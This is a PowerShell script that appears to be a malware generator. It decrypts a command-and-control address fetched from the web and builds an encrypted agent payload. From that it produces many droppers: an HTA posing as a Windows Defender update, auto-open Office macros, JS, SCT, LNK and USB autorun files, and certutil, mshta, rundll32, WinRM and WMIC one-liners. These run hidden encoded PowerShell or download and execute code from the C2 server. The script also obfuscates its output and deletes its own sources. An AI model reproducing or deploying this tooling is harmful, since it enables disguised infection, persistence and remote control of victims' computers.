# Generator v3.0 
#echo on
Write-Host "Reading parameters from 'config.ini' file..." -ForegroundColor DarkGreen;
Get-Content ".\config.ini" | ForEach-Object -Begin {$settings=@{}} -Process {$store = [regex]::split($_,'='); if(($store[0].CompareTo("") -ne 0) -and ($store[0].StartsWith("[") -ne $True) -and ($store[0].StartsWith("#") -ne $True)) {$settings.Add($store[0], $store[1])}}
If (Test-Path  .\Output){ Remove-Item -path .\Output }
$md = {md Output;
md hta;
md png;
md exe;
md xls;
md sct;
md js ;
md bat;
md lnk;
md usb;
md c2c;
md zxd;
md vbs;
md ico;
}
& $md
Write-Host "Integrating parameters from 'config.ini' file in variables... `n" -ForegroundColor DarkGreen;
#$usbspreading = $settings.Get_Item("usbspreading")
$getc2 = $settings.Get_Item("getC2")
$keyreadgetC2 = $settings.Get_Item("keytoreadgetC2")
$rootfolder = $settings.Get_Item("rootfolder")
$ops = $settings.Get_Item("ops")
$upgradepshell = $settings.Get_Item("upgradepshell")
$sleeptime1 = $settings.Get_Item("sleeptime1")
$sleeptime2 = $settings.Get_Item("sleeptime2")
$sleeptime3 = $settings.Get_Item("sleeptime3")
$evilimage = $settings.Get_Item("evilimage")
$lnkicon = $settings.Get_Item("lnkicon")
$lnkname = $settings.Get_Item("lnkname")
$enddate = $settings.Get_Item("enddate")
$workstart = $settings.Get_Item("workstart")
$workend = $settings.Get_Item("workend")
$keyupload = $settings.Get_Item("keyupload")
$keyupload2 = $settings.Get_Item("keyupload2")
$autopersist = $settings.Get_Item("autopersist")
$defaultpersist = $settings.Get_Item("defaultpersist")
$regkey = $settings.Get_Item("regkey")
$wmikey = $settings.Get_Item("wmikey")
$passcrypt = $settings.Get_Item("passcrypt")
$thatsalt = $settings.Get_Item("salt")
$obfuscationToken = $settings.Get_Item("obfuscationToken")
Import-Module .\obfuscator\Invoke-Obfuscation.psd1

$getc2

############## ENCRYPTION BLOCK ########################
function Create-AesManagedObject($key, $IV) {
			$aesManaged = New-Object "System.Security.Cryptography.AesManaged"
			$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
			$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
			$aesManaged.BlockSize = 128
			$aesManaged.KeySize = 256
			if ($IV) {
				if ($IV.getType().Name -eq "String") {
					$aesManaged.IV = [System.Convert]::FromBase64String($IV)
				}
				else {
					$aesManaged.IV = $IV
				}
			}
			if ($key) {
				if ($key.getType().Name -eq "String") {
					$aesManaged.Key = [System.Convert]::FromBase64String($key)
				}
				else {
					$aesManaged.Key = $key
				}
			}
			$aesManaged
		}		 
function Create-AesKey() {
			$aesManaged = Create-AesManagedObject
			$aesManaged.GenerateKey()
			
			[System.Convert]::ToBase64String($aesManaged.Key)
		}		 
function Encrypt-String($key, $unencryptedString) {
			$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
			$aesManaged = Create-AesManagedObject $key 
			
			$encryptor = $aesManaged.CreateEncryptor()
			$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
			[byte[]] $fullData = $aesManaged.IV + $encryptedData
			$aesManaged.Dispose()
			[System.Convert]::ToBase64String($fullData)
		}		 
function Decrypt-String($key, $encryptedStringWithIV) {
	$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
	$IV = $bytes[0..15]
	$aesManaged = Create-AesManagedObject $key $IV
	$decryptor = $aesManaged.CreateDecryptor();
	$unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
	#$aesManaged.Dispose()
	[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
	}
########################################################

function TestInternet { # Test internet connexion
	[CmdletBinding()] 
	param() 
	process { 
	[Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]'{DCB00C01-570F-4A9B-8D69-199FDBA5723B}')).IsConnectedToInternet 
	}  
} 
$t = TestInternet

$c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("$getc2")
Write-Host "Cypher text: $c2cEncrypted" 
if ($keyreadgetC2.length -eq 43) {$keyreadgetC2 = $keyreadgetC2 + '=' }
if ($keyreadgetC2.length -eq 42) {$keyreadgetC2 = $keyreadgetC2 + '==' }
Write-Host "Decryption Key:  $keyreadgetC2" 
Write-Host "Decryption of C2C Pastebin stored value ....." -ForegroundColor Yellow;
$c2c = Decrypt-String "$keyreadgetC2" "$c2cEncrypted" 

echo "$c2c ..."

while ($t -eq $False) { #check internet connexion before continue (wait until internet is up)
	$t = TestInternet
	Start-Sleep -Seconds 10 
	echo "Need ACTIVE INTERNET CONNEXION !!! "
	if ($t -eq $True) {
	$c2c = (New-Object System.Net.WebClient).DownloadString("$getc2")
    $c2c	
		while (!$c2c) {
			$c2c = (New-Object System.Net.WebClient).DownloadString("$getc2")
			echo "$c2c - EMPTY !!! "	
			Start-Sleep -Seconds 5
			if ($c2c){
				[string]$enc = (cmd /c echo {IEX ((New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/link/pnt.ps1"))}).split(' ')[1] 
			break	}
		}
	break}
}
Start-Sleep -Seconds 3


(get-content .\zxd.ps1) | foreach-object {$_ -replace "ROOT_FOLDER", "$rootfolder" -replace "SERVER_IP_ADDRESS", "$c2c" } | set-content .\zxd.ps1	
Start-Sleep -Seconds 2
Import-Module .\zxd.ps1
[string]$enc = zxd_generateEncoded

# Displaying the parameters
Write-Host "Get C2 value - C2 value is:" $c2c -ForegroundColor DarkRed;
Write-Host "Encoded version :" $enc;
Set-Content .\zxd\encoded.txt -Value $enc

#Remove comments  --- Remove-Comments

Import-Module .\obfuscator\CleanComments.ps1
CleanComments -Path .\agent_pnt.ps1| set-content .\agent_pnt.ps1
CleanComments -Path .\appdat.ps1 | set-content .\appdat.ps1

#CleanComments -Path .\agent.ps1 | set-content .\agent.ps1
#CleanComments -Path .\agent_pnt.ps1| set-content .\agent_pnt.ps1
#CleanComments -Path .\appdat.ps1 | set-content .\appdat.ps1

(get-content .\agent.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "UPGRADEPOWERSHELL", "$upgradepshell" -replace "ROOT_FOLDER", "$rootfolder" -replace "MYOPS", "$ops" -replace "SLPTM1", "$sleeptime1" -replace "SLPTM2", "$sleeptime2" -replace "SLPTM3", "$sleeptime3" -replace "ENDDATE", "$enddate" -replace "WORKSTART", "$workstart" -replace "WORKEND", "$workend" -replace "KEYUPLOAD", "$keyupload" -replace "KEYUPLOAD", "$keyupload2"  -replace "AUTOPERSIST", "$autopersist"  -replace "DEFAULTPERSIST", "$defaultpersist" -replace "REGKEY", "$regkey"  -replace "WMIKEY", "$wmikey"  -replace "MYENCODED", "$enc" } | set-content .\temp.ps1
CleanComments -Path .\temp.ps1| set-content .\payload.ps1
#get-content .\temp.ps1 | set-content .\payload.ps1
set-content .\temp.ps1 -Value ""
Remove-Item -path .\temp.ps1 -recurse
$ooo = Read-Host -Prompt 'OK'

Write-Host "--------------> 10 %" -ForegroundColor DarkGreen;
Start-Sleep -Seconds 2
function Out-EncryptedScript {
[CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ScriptPath,
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Password,
        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Salt,
        [Parameter(Position = 3)]
        [String]
        $InitializationVector = ( @( foreach ($i in 1..16) { [Char](Get-Random -Min 0x41 -Max 0x5B) } ) -join '' ), # Generate random 16 character IV
        [Parameter(Position = 4)]
        [String]
        $FilePath = ".\c2c\pntx.ps1"
    )

    $AsciiEncoder = New-Object System.Text.ASCIIEncoding
    $ivBytes = $AsciiEncoder.GetBytes("SORRYYOUAREPWNED!")
    # While this can be used to encrypt any file, it's primarily designed to encrypt itself.
    [Byte[]] $scriptBytes = Get-Content -Encoding byte -Path $ScriptPath
    $DerivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($Password, $AsciiEncoder.GetBytes($Salt), "SHA1", 2)
    $Key = New-Object System.Security.Cryptography.RijndaelManaged
    $Key.Mode = [System.Security.Cryptography.CipherMode]::CBC
    [Byte[]] $KeyBytes = $DerivedPass.GetBytes(32)
    $Encryptor = $Key.CreateEncryptor($KeyBytes, $ivBytes)
    $MemStream = New-Object System.IO.MemoryStream
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemStream, $Encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $CryptoStream.Write($scriptBytes, 0, $scriptBytes.Length)
    $CryptoStream.FlushFinalBlock()
    $CipherTextBytes = $MemStream.ToArray()
    $MemStream.Close()
    $CryptoStream.Close()
    $Key.Clear()
    $Cipher = [Convert]::ToBase64String($CipherTextBytes)
# Generate encrypted PS1 file. All that will be included is the base64-encoded ciphertext and a slightly 'obfuscated' decrypt function
$Output = 'function de([String] $b, [String] $c) 
{ 
$a = "'
$Output += $cipher
$Output += '"'
$Output += '; 
$encoding = New-Object System.Text.ASCIIEncoding; 
$dd = $encoding.GetBytes("SORRYYOUAREPWNED!"); 
$aa = [Convert]::FromBase64String($a); 
$derivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($b, $encoding.GetBytes($c), "SHA1", 2); 
[Byte[]] $e = $derivedPass.GetBytes(32); 
$f = New-Object System.Security.Cryptography.RijndaelManaged; 
$f.Mode = [System.Security.Cryptography.CipherMode]::CBC; 
[Byte[]] $h = New-Object Byte[]($aa.Length); 
$g = $f.CreateDecryptor($e, $dd); 
$i = New-Object System.IO.MemoryStream($aa, $True); 
$j = New-Object System.Security.Cryptography.CryptoStream($i, $g, [System.Security.Cryptography.CryptoStreamMode]::Read); 
$r = $j.Read($h, 0, $h.Length); 
$i.Close(); 
$j.Close(); 
$f.Clear(); 
return $encoding.GetString($h,0,$h.Length); 
}'
    # Output decrypt function and ciphertext to evil.ps1
    Out-File -InputObject $Output -Encoding ASCII $FilePath
    Write-Verbose "Encrypted PS1 file saved to: $(Resolve-Path $FilePath)"

}
Out-EncryptedScript .\payload.ps1 $passcrypt $thatsalt

(get-content .\agent_pnt.ps1) | foreach-object {$_ -replace "GETC2URL", "$getc2" -replace "KEYTOREADGETC2", "$keyreadgetC2" -replace "ROOT_FOLDER", "$rootfolder" -replace "PASSCRYPT", "$passcrypt" -replace "SALT", "$thatsalt" } | set-content .\c2c\pnt.ps1
$Pnt_Direct_Attack = Out-EncodedCommand -Path .\c2c\pnt.ps1 -NonInteractive -NoProfile -WindowStyle Hidden -EncodedOutput
set-content .\c2c\pnt-Encoded.bat -Value "powershell -exec bypass -Nol -Win Hidden -Enc $Pnt_Direct_Attack"
Write-Host "Encoded > \c2c\pnt-Encoded.bat"

(get-content .\autorunTemplate.inf) | foreach-object {$_ -replace "LNKFILE", "$lnkname" -replace "LNKICON", "$lnkicon" } | set-content .\usb\autorun.inf
(get-content .\appdat.ps1) | foreach-object {$_ -replace "LNKFILE", "$lnkname" -replace "LNKICON", "$lnkicon" -replace "ENCODED", "$enc" } | set-content .\c2c\appdat.ps1
Write-Host "--------------> 20 %" -ForegroundColor DarkGreen;
set-content .\agent.ps1 -Value ""
set-content .\agent_pnt.ps1 -Value ""

set-content .\generator.ps1 -Value ""
set-content .\zxd.ps1 -Value ""
Rename-Item .\agent.ps1 brib1.txt
Rename-Item .\agent_pnt.ps1 brib2.txt
Rename-Item .\generator.ps1 brib3.txt
Rename-Item .\zxd.ps1 brib4.txt
Rename-Item .\appdat.ps1 brib5.txt
#attrib -h .\payload.ps1
Remove-Item -path .\brib1.txt -recurse
Remove-Item -path .\brib2.txt -recurse
Remove-Item -path .\brib3.txt -recurse
Remove-Item -path .\brib4.txt -recurse
Remove-Item -path .\brib5.txt -recurse

Write-Host "--------------> 30 %" -ForegroundColor DarkGreen;
function Out-HTA {
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $VBFilename="launchps.vbs",
        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $HTAFilePath="$pwd\WindDefefender_WebUpdate.hta",
        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $VBFilepath="$pwd\launchps.vbs"
    )
    if(!$Payload)
    {
        $Payload = "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc;$Arguments"
    }
    
    $HTA = @"
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <title>Windows Defender Web Install</title>
    <script src="$VBFilename" type="text/vbscript" >
    </script>
    <hta:application
       id="oHTA"
       applicationname="Windows Defender Web Install"
       application="yes"
    >
    </hta:application>
    </head>

    <SCRIPT TYPE="text/javascript">
    function start(){

    Initialize();

    }
    //-->
    </SCRIPT>
    <div> 
    <object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%">
    </object></div>   
 
  
    <body onload="start()">
    </body>
    </html>
"@
    $vbsscript = @"
    Sub Initialize()
    Set oShell = CreateObject( "WScript.Shell" )
    ps = "$Payload"
    oShell.run(ps),0,true
    End Sub
"@
    Out-File -InputObject $HTA -FilePath $HTAFilepath
    Out-File -InputObject $vbsscript -FilePath $VBFilepath
    Write-Output "HTA and VBS written to $HTAFilepath and $VBFilepath respectively."
}
Out-HTA -Payload "PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc" -HTAFilepath .\hta\WinDefender_WebUpdate.hta -VBFilepath .\hta\launch.vbs

Write-Host "--------------> 40 %" -ForegroundColor DarkGreen;
function Out-VBSMacro {
$weapon = "powershell.exe -Exec Bypass -NoL -Nop -Win hidden -Enc $enc"

<#	$macrovbs = @"
Sub Auto_Open()
Sheets("Access denied").Visible = True
Sheets("Access denied").Select
Sheets("Protected").Visible = False
Dim strCommand As String
strCommand = "$weapon"
Shell strCommand, 0
End Sub
"@#>

	$macrovbs = @"
Sub Auto_Open()
Dim strCommand As String
strCommand = "$weapon"
Shell strCommand, 0
End Sub
"@




	$macrovbs_w = @"
Sub Document_Open()
Dim strCommand As String
strCommand = "$weapon"
Shell strCommand, 0
End Sub
"@

	$vbsscript = @"
Dim objShell
Set objShell = WScript.CreateObject ("WScript.shell")
ps = "$weapon"
objShell.run(ps),0,true
Set objShell = Nothing
"@
	echo $vbsscript > .\vbs\agent.vbs
	echo $macrovbs > .\xls\macroexcel.vba
	echo $macrovbs_w > .\xls\macroword.vba	
	echo $macrovbs > .\c2c\macro.txt	
	}
Out-VBSMacro
set-content .\vbs\agent_vbs.bat -Value "wscript.exe /NoLogo /B .\agent.vbs"
Write-Host "Macro & VBS ready "

$callmacropack = @"
macropack.exe -f .\macroexcel.vba -o -v .\macroexcel_obf.vba
macropack.exe -f .\macroword.vba -o -v .\macroword_obf.vba
"@
set-content .\xls\macro_obfuscate.bat -Value $callmacropack

Write-Host "Macro obfuscated - Check Variables syntax before use "
Write-Host "-------------> 50 %" -ForegroundColor DarkGreen;

function Out-JS {
    [CmdletBinding()] Param(       
        [String]$Payload,
        [String]$OutputPath = "$pwd\style.js"
    )
	$Payload = "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc"
    $cmd = @"
c = "$Payload";
r = new ActiveXObject("WScript.Shell").Run(c,0,true);
"@
    Out-File -InputObject $cmd -FilePath $OutputPath -Encoding default
    Write-Output "Weaponized JS file written to $OutputPath"
	}
Out-JS -Payload "PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc" -OutputPath .\js\style.js
copy .\js\style.js .\c2c
$runjs = @"
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){}h.Open("GET","$c2c/$rootfolder/link/style.js",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
"@
set-content .\js\stylejs.bat -Value $runjs

Write-Host "--------------> 70 %" -ForegroundColor DarkGreen;
function Out-SCT {
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,
        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $OutputPath = "$pwd\UpdateCheck.xml"
    )
    if(!$Payload)
    {
        $Payload = @"
Set-Item Variable:/P0 'Net.WebClient';SI Variable:EJk '$PayloadURL';dir ect*;Set-Variable ex (.$ExecutionContext.InvokeCommand.GetCmdlet($ExecutionContext.InvokeCommand.GetCommandName('N*-O*',$TRUE,1))(Item Variable:/P0).Value);SI Variable:/z ((((Variable ex).Value|Get-Member)|?{(Get-Variable _ -ValueOn).Name-ilike'Op*ad'}).Name);Set-Variable ex (Variable ex).Value.((ChildItem Variable:z).Value).Invoke((ChildItem Variable:\EJk).Value);SI Variable:/H '';Try{While((Get-Variable H).Value+=[Char](Variable ex).Value.ReadByte()){}}Catch{};Invoke-Expression((Get-Variable H).Value)
"@
    }  
    $cmd = @"
<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="WinProcess"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

    <script language="JScript">
		<![CDATA[
	
			ps = 'powershell.exe -w h -nol -nop -ep bypass -c ';
            c = "$Payload";
            r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
	
		]]>
	</script>
    </registration>

    <public>
    <method name="Exec"></method>
    </public>
	<script language="JScript">
		<![CDATA[
	        
            function Exec()
            {
			    ps = 'powershell.exe -w h -nol -nop -ep bypass ';
                c = "$Payload";
                r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
	        }
		]]>
</script>
</scriptlet>
"@

    Out-File -InputObject $cmd -FilePath $OutputPath -Encoding default
    Write-Output "Weaponized SCT file written to $OutputPath"
    Write-Output "Host $OutputPath on a web server."
}

#Out-SCT -Payload "PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc"  -OutputPath .\sct\KB0985412
Out-SCT -OutputPath .\sct\KB0985412
copy .\sct\KB0985412 .\c2c
$sctfile = "regsvr32.exe /u /n /s /i:$c2c/$rootfolder/link/KB0985412 scrobj.dll"
echo $sctfile > .\sct\sct.bat

Write-Host "Weaponized SCT file "
Write-Host "-----------> 80 %" -ForegroundColor DarkGreen;
function Out-LNK {
    [CmdletBinding()] Param(   
        [String] $Executable = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        [String] $Payload = " -Exec Bypass -nol -W hidden -Enc $enc",
        [String] $OutputPath ,
        [String] $Icon ,
		[String] $Description 
    )
    if(!$Payload)
    {  $Payload = " -Exec Bypass -nol -W hidden -Enc $enc"    }
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($OutputPath)
    $Shortcut.TargetPath = $Executable			
    $Shortcut.Description = $Description 
    $Shortcut.WindowStyle = 7
    $Shortcut.IconLocation = "$Icon"
    $Shortcut.Arguments = $Payload
    $Shortcut.Save()
    Write-Output "LNK file: $OutputPath"
	}
Out-LNK -OutputPath $pwd\Wordpad.lnk -Icon "C:\Program Files\Windows NT\Accessories\wordpad.exe,1" -Description "WordPad Document shortcut"
Out-LNK -OutputPath $pwd\Explorer.lnk -Icon "explorer.exe,0" -Description "Windows Explorer shortcut"
Out-LNK -OutputPath $pwd\Windows.lnk -Icon "explorer.exe,23" -Description "Windows Updates shortcut"
Out-LNK -OutputPath $pwd\Folder.lnk -Icon "explorer.exe,13" -Description "Folder shortcut"
Out-LNK -OutputPath $pwd\$lnkname -Icon "%SystemRoot%\system32\SHELL32.dll,7" -Description "Disk shortcut"

Write-Host "Weaponized LNK file "

function Out-Certutil {
	$Certutil = @"
certutil -urlcache -split -f $c2c/$rootfolder/link/pnt.bat %temp%\p.bat
start %temp%\p.bat 
"@
	set-content .\bat\certutil.bat -Value $Certutil
	}
Out-Certutil
Write-Host "Weaponized CERTUTIL file "
	
function Out-Mshta {
	$mshta = @"
mshta.exe javascript:a=(GetObject("script:$c2c/$rootfolder/link/KB0985412")).Exec();close();
"@
	set-content .\bat\mshta.bat -Value $mshta
	}
Out-Mshta
Write-Host "Weaponized MSHTA file "
	
function Out-RunDll {
	$rundll = @"
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:$c2c/$rootfolder/link/KB0985412").Exec();
"@
	set-content .\bat\rundll.bat -Value $rundll
	}
Out-RunDLL
Write-Host "Weaponized RUNDLL32 file "
	
function Out-WinRM {
	$winrm = @"
winrm qc -q
winrm i c wmicimv2/Win32_Process @{CommandLine="PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc"}
"@
	set-content .\bat\winrm.bat -Value $winrm
	}
Out-WinRM
Write-Host "Weaponized WINRM file "

function Out-Wmic {
	$xsl = @"
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
  <ms:script implements-prefix="user" language="Jscript">
  <![CDATA[
  var x = new ActiveXObject("WScript.Shell").Run("PowerShell -Exec Bypass -NoL -W Hidden -Enc $enc");
  ]]></ms:script>
</stylesheet>
"@
	set-content .\c2c\wmic.xsl  -Value $xsl
	$wmic = @"
wmic os get /format:"$c2c/$rootfolder/link/wmic.xsl"
"@
	set-content .\bat\wmic.bat -Value $wmic
	}
Out-Wmic
Write-Host "Weaponized WMIC file "

function Out-Obfuscate {
	Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString("$c2c/$rootfolder/link/pnt.ps1")} -Command "$obfuscationToken .\bat\pnt-obfuscated.bat" -Quiet
	Write-Host "Obfuscate > \bat\pnt-obfuscated.bat"
	cscript.exe .\obfuscator\vbs_obfuscator.vbs .\vbs\agent.vbs > .\vbs\agent_obfuscated.vbs
	}
Out-Obfuscate
	
Write-Host "Obfuscation OK "
Write-Host "--------------> 90 %" -ForegroundColor DarkGreen;
echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $enc" > .\bat\pnt.bat
copy .\bat\pnt.bat .\c2c
copy .\c2c\pnt-Encoded.bat .\bat
move .\pnt.SED .\exe
set-content .\payload.ps1 -Value ""
Rename-Item .\payload.ps1 note.txt
move .\index.html .\hta
move .\template.xlsm .\xls
move .\template.xls .\xls
move .\template.docm .\xls
move .\template.doc .\xls
move .\MacroPack.exe .\xls
Remove-Item -path .\note.txt
Remove-Item -path .\autorunTemplate.inf
Write-Host "."
Write-Host "."

Import-Module .\obfuscator\Invoke-CradleCrafter.psd1
$cradle = Invoke-CradleCrafter -Url "$c2c/$rootfolder/link/pnt.ps1" -Command 'Memory\*\All\1' -Quiet  
set-content .\c2c\pnt-secured-iex.ps1 -Value $cradle
Write-Host "CradleCrafter > \c2c\pnt-secured-iex.ps1"

move .\*.ico .\ico
move .\ico .\Output
move .\bat .\Output
move .\$evilimage .\png
move .\png .\Output
move .\hta .\Output
move .\vbs .\Output
move .\Wordpad.lnk .\lnk
move .\Explorer.lnk .\lnk
move .\Windows.lnk .\lnk
move .\Folder.lnk .\lnk
move .\$lnkname .\usb
move .\lnk .\Output
move .\xls .\Output
move .\js .\Output
move .\exe .\Output
move .\sct .\Output
move .\usb .\Output
move .\c2c .\Output
move .\zxd .\Output
move .\HttpRatServer.ps1 .\Output
move .\JSRatServer.ps1 .\Output

Write-Host "Clean tasks"
Write-Host "---- FINISH ------> 100 %" -ForegroundColor Red;
$ooo = Read-Host -Prompt 'OK'